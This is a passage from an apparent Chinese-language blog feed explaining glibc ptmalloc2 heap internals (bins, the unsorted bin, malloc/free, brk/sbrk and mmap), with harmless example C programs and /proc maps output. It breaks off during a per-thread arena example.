class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz)                                                     \</span></span><br><span class="line">    (SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz) : MALLOC_ALIGNMENT == <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin可以视为空闲chunk回归其所属bin之前的缓冲区。<br>其在glibc中具体的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>从下面的宏我们可以看出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><p>unsorted bin 处于我们之前所说的bin数组下标1处。故而unsortedbin只有一个链表。<br>unsorted bin中空闲的chunk处于乱序状态，主要有两个来源<br>①当一个较大的chunk被分割成两半后，如果剩下的部分大于MINSIZE，就会被放到unsorted<br>bin中。<br>②释放一个不属于fast bin的chunk，并且该chunk不和top chunk紧邻时，该chunk会被放到<br>unsorted bin中。关于top chunk的解释，请参考下面的介绍。</p><p>此外，Unsorted bin在使用的过程中，采用的遍历顺序是FIFO。</p><h3 id="common-macro"><a href="#common-macro" class="headerlink" title="common macro"></a>common macro</h3><p>这里介绍一些通用的宏。<br>根据chunk的大小统一地获得chunk所在的索引</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define bin_index(sz)                                                          \</span></span><br><span class="line">    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆概述</title>
    <link href="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/"/>
    <url>/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h3><p>在程序运行的过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实<br>就是程序虚拟空间的一块连续的线性区域，它由低地址向高地址增长。我们一般称管理堆的<br>那部分程序为堆管理器。</p><p>对管理器处于用户程序与内核中间，主要做以下工作</p><p>1.响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了<br>保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器<br>通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统<br>进行交互。</p><p>2.管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由<br>堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存需求。</p><p>Linux中早期的堆分配与回收有Doug Lea实现，但它在并行处理多个线程时，会共享进程的<br>堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁，然而，与此同时，加锁<br>会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，<br>没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger在Doug Lea的基础上<br>进行改进使其可以支持多线程，这个堆分配器就是Ptmalloc。在glibc-2.3.x.之后，glibc中<br>集成了ptmalloc2.</p><p>目前linux标准发行版中使用的堆分配器就是glibc中的堆分配器：ptmalloc2。ptmalloc2主<br>要是通过malloc/free函数来分配和释放内存块。</p><p>需要注意的是，在内存分配和使用的过程中，linux有这样的一个基本内存管理思想，只有当<br>真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。所以虽然操作系统<br>已经给程序分配了很大的一块内存，但是这块内存其实就是虚拟内存。只有当用户使用到<br>相应的内存时，系统才会真正分配物理页面给用户使用。</p><h3 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h3><p>这里我们主要介绍<br>①基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用<br>②接受堆目前的多线程支持</p><h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p>在glibc的malloc.c中，malloc的说明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看出，malloc函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况<br>进行了处理。<br>①当n=0时，返回当前系统允许的堆的最小内存块。<br>②当n为负数时，由于在大多数系统上，size_t是无符号数，所以程序就会申请很大的内存<br>空间，但通常来说都会失败，因为系统没有那么多内存可以分配。</p><h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p>在glibc的malloc.c中，free的说明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      free(void* p)</span></span><br><span class="line"><span class="comment">      Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">      allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">      effects if p has already been freed.</span></span><br><span class="line"><span class="comment">      Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">      when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">      back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure><p>可以看出，free函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到，<br>也有可能是通过相关的函数realloc得到的。</p><p>此外，该函数也同样对异常情况进行了处理<br>①当p为空指针时，函数不进行任何操作<br>②当p已经被释放后，再次释放回出现乱七八糟的效果，这其实就是double free。<br>③除了被禁用mallopt的情况下，当释放很大的内存空间时，程序就会将这些内存空间还给<br>系统，以便于减小程序所使用的内存空间。</p><p>内存分配背后的系统调用</p><p>在前面提到的函数中，无论是malloc函数还是free函数，我们动态申请和释放内存时，都经常<br>会使用，但它们不是真正与系统交互的函数。这些函数背后的系统调用主要是(s)brk函数以及<br>mmap,munmap函数。</p><p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p><p><img src="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/1.png" alt="1.png"></p><p>(s)brk<br>对于堆的操作，操作系统提供了brk函数，glibc库提供了sbrk函数，我们可以通过增加brk的<br>大小来向操作系统申请内存。</p><p>初始时，堆的起始地址start_brk以及堆的当前末尾brk指向同一地址。根据是否开启ASLR，<br>两者的具体位置会有所不同。<br>①不开启ASLR保护时，start_brk以及brk会指向data/bss段的结尾。<br>②开启ASLR保护时，start_brk以及brk也会指向同一位置，只是这个位置在data/bss段结尾<br>后的随机偏移处。</p><p>具体效果如下图：</p><p><img src="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/2.png" alt="2.png"></p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，在每一次执行完操作后，都执行了getchar()函数，这是为了方便我们查看<br>程序真正的映射。</p><p><strong>在第一次调用brk之前</strong></p><p>从下面的输出可以看出，并没有出现堆。因此<br>①start_brk=brk=end_data=0x804b000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>第一次增加brk后</strong><br>从下面的输出可以看出，已经出现了堆段<br>①start_brk=end_data=0x804b000<br>②brk=0x804c000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">Program Break Location2:0x804c000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">0804b000-0804c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p>其中，关于堆的那一行<br>①0x0804b000是响应堆的起始地址<br>②rw-p表明堆具有可读可写权限，并且属于隐私数据。<br>③00000000表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为0。<br>④00:00是主从的设备号，这部分内容也不是从文件中映射得到的，所以也都为0。<br>⑤0表示Inode号。由于这部分内容并不是从文件中映射得到的，所以为0。</p><p><strong>mmap</strong><br>malloc会使用mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的<br>内存，并且这块内存仅仅被进程所使用。</p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在执行mmap之前</strong><br>我们可以从下面的输出看到，目前只有.so文件的mmap段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>mmap后</strong><br>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了b7e00000<br>到b7e21000的mmap段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>munmap</strong><br>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的dlmalloc实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请<br>内存，而另外一个线程则必须等待知道临界区中不再有线程。这是因为所有的线程共享一个<br>堆。在glibc的ptmalloc实现中，比较好的一点就是支持了多线程的快速访问。在新的实现<br>中，所有线程共享多个堆。</p><p>这里给出一个例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一次申请之前</strong>，没有任何堆段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span 